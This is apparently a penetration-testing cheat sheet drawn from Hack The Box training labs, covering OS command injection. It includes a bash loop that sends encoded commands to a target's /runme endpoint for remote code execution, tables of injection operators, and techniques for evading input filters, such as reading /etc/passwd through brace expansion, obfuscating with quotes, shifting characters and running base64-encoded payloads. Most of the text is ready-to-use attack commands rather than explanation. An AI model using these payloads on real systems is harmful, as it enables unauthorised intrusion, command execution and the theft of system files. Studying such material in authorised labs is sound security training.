#### Enumeration

**Identifying**

`L3pr3ch4un@htb[/htb]$ sudo tcpdump -i tun0 icmp`

And `ping <your ip>`

#### Automate executing **commands**
```bash
function rce() {
	while true; do
		echo -n "# "; read cmd
		ecmd=$(echo -n $cmd | jq -sRr @uri | jq -sRr @uri | jq -sRr @uri)
		curl -s -o - "http://<TARGET IP>/runme?x=${ecmd}"
		echo ""
	done
}
```

| Injection Operator | Injection Character | URL-Encoded Character | Executed Command                           |                                    |                              |
| ------------------ | ------------------- | --------------------- | ------------------------------------------ | ---------------------------------- | ---------------------------- |
| Semicolon          | ;                   | %3b                   | Both                                       |                                    |                              |
| New Line           | \n                  | %0a                   | Both                                       |                                    |                              |
| Background         | &                   | %26                   | Both (second output generally shown first) |                                    |                              |
| Pipe               |                     |                       | %7c                                        | Both (only second output is shown) |                              |
| AND                | &&                  | %26%26                | Both (only if first succeeds)              |                                    |                              |
| OR                 |                     |                       |                                            | %7c%7c                             | Second (only if first fails) |
| Sub-Shell          | ``                  | %60%60                | Both (Linux-only)                          |                                    |                              |
| Sub-Shell          | $()                 | %24%28%29             | Both (Linux-only)                          |                                    |                              |

The easiest method to customize the HTTP requests being sent to the back-end server is to use a web proxy

| Injection Type                          | Operators                           |     |
| --------------------------------------- | ----------------------------------- | --- |
| SQL Injection                           | ' , ; -- /* */                      |     |
| Command Injection                       | ; &&                                |     |
| LDAP Injection                          | * ( ) &                             |     |
| XPath Injection                         | ' or and not substring concat count |     |
| OS Command Injection                    | ; &                                 |     |
| Code Injection                          | ' ; -- /* */ $() ${} #{} %{} ^      |     |
| Directory Traversal/File Path Traversal | ../ ..\\ %00                        |     |
| Object Injection                        | ; &                                 |     |
| XQuery Injection                        | ' ; -- /* */                        |     |
| Shellcode Injection                     | \x \u %u %n                         |     |
| Header Injection                        | \n \r\n \t %0d %0a %09              |     |

**Bypassing blacklisted characters**

`/`:`echo ${PATH:0:1}`

`cat /etc/passwd`:`{cat,/etc/passwd}`

`\`:`$env:HOMEPATH[0]`

`21y4d@htb[/htb]**$** w'h'o'am'i`

`21y4d@htb[/htb]**$** w"h"o"am"i`

`who$@ami`

`C:\htb> who^ami`

**Character Shifting**

There are other techniques to produce the required characters without using them, like shifting characters. For example, the following Linux command shifts the character we pass by 1. So, all we have to do is find the character in the ASCII table that is just before our needed character (we can get it with man ascii), then add it instead of [ in the below example. This way, the last printed character would be the one we need

```
XeroCyb3r@htb[/htb]$ man ascii     # \ is on 92, before it is [ on 91
XeroCyb3r@htb[/htb]$ echo $(tr '!-}' '"-~'<<<[)
```

**Case Manipulation**

`21y4d@htb[/htb]$ $(tr "[A-Z]" "[a-z]"<<<"WhOaMi")`

**Reversing**

`XeroCyb3r@htb[/htb]**$** echo -n 'cat /etc/passwd | grep 33' | base64`

`XeroCyb3r@htb[/htb]**$** bash<<<**$**(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)`

`PS C:\htb> [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))`

`XeroCyb3r@htb[/htb]**$** echo -n whoami | iconv -f utf-8 -t utf-16le | base64`

`PS C:\htb> iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"`

## Evasion Tools

- Bashfuscator
- DOSfuscation(Windows)

## Reference:

- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#bypass-without-space
